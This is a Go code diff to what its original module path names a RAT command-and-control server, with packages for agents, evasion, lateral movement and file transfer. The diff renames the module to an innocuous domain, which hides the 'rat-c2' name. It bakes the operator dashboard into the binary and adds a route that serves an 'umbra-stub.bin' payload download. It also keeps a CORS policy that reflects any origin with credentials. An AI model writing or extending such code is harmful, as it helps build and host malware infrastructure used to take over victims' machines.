@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
+	"io/fs"
 	"log"
 	"net/http"
 	"os"
@@ -23,15 +24,16 @@ import (
 	_ "modernc.org/sqlite"
 	"github.com/spf13/viper"
 
-	"rat-c2-server/internal/agent"
-	"rat-c2-server/internal/api"
-	"rat-c2-server/internal/config"
-	"rat-c2-server/internal/db"
-	"rat-c2-server/internal/evasion"
-	"rat-c2-server/internal/filetransfer"
-	"rat-c2-server/internal/lateral"
-	"rat-c2-server/internal/task"
-	"rat-c2-server/internal/ws"
+	"chemicalumbra.dev/server/pkg/agent"
+	"chemicalumbra.dev/server/pkg/api"
+	"chemicalumbra.dev/server/pkg/config"
+	"chemicalumbra.dev/server/pkg/db"
+	"chemicalumbra.dev/server/pkg/evasion"
+	"chemicalumbra.dev/server/pkg/filetransfer"
+	"chemicalumbra.dev/server/pkg/lateral"
+	"chemicalumbra.dev/server/pkg/task"
+	"chemicalumbra.dev/server/pkg/ws"
+	umbraweb "chemicalumbra.dev/server/web"
 )
 
 var (
@@ -192,31 +194,62 @@ func (s *Server) setupAPIServer() {
 		AllowOriginFunc: func(origin string) bool {
 			return true // reflect any origin; credentials still permitted
 		},
-		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
+		AllowMethods:     []string{"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"},
 		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "X-Requested-With"},
 		ExposeHeaders:    []string{"Content-Length"},
 		AllowCredentials: true,
 		MaxAge:           12 * time.Hour,
 	}))
+	r.OPTIONS("/*path", func(c *gin.Context) {
+		c.Status(http.StatusNoContent)
+	})
 
-	// Static files for web dashboard
-	r.Static("/assets", "./web/dist/assets")
-	// Serve index.html via handler so we can inject a cache-busting query
-	// on the bundled asset URLs (guarantees a fresh load after every rebuild).
+	// Dashboard is baked into the binary so Vercel (and any cwd) can serve it.
+	distFS, err := fs.Sub(umbraweb.DistFS, "dist")
+	if err != nil {
+		log.Printf("[web] embed subfs: %v", err)
+		distFS = umbraweb.DistFS
+	}
+	if assetsFS, err := fs.Sub(distFS, "assets"); err == nil {
+		r.StaticFS("/assets", http.FS(assetsFS))
+	} else {
+		log.Printf("[web] assets embed: %v", err)
+		r.Static("/assets", "./web/dist/assets")
+	}
 	serveIndex := func(c *gin.Context) {
-		data, err := os.ReadFile("./web/dist/index.html")
+		data, err := fs.ReadFile(distFS, "index.html")
+		if err != nil {
+			data, err = os.ReadFile("./web/dist/index.html")
+		}
 		if err != nil {
 			c.Status(http.StatusNotFound)
 			return
 		}
-		// buildTime is a unix-second stamp; changes on each server restart,
-		// which is enough to bust a cached HTML that points at an old bundle.
 		v := strconv.FormatInt(buildTimeStamp, 10)
 		html := assetTagRegex.ReplaceAll(data, []byte(`="$1?v=`+v+`"`))
 		c.Data(http.StatusOK, "text/html; charset=utf-8", html)
 	}
 	r.GET("/", serveIndex)
+	r.GET("/umbra-stub.bin", func(c *gin.Context) {
+		data, err := fs.ReadFile(distFS, "umbra-stub.bin")
+		if err != nil {
+			data, err = os.ReadFile("./web/dist/umbra-stub.bin")
+		}
+		if err != nil {
+			data, err = os.ReadFile("./web/public/umbra-stub.bin")
+		}
+		if err != nil {
+			c.Status(http.StatusNotFound)
+			return
+		}
+		c.Header("Cache-Control", "no-store")
+		c.Data(http.StatusOK, "application/octet-stream", data)
+	})
 	r.NoRoute(func(c *gin.Context) {
+		if c.Request.Method == http.MethodOptions {
+			c.Status(http.StatusNoContent)
+			return
+		}
 		if c.Request.Method == http.MethodGet && !strings.HasPrefix(c.Request.URL.Path, "/api") {
 			serveIndex(c)
 			return
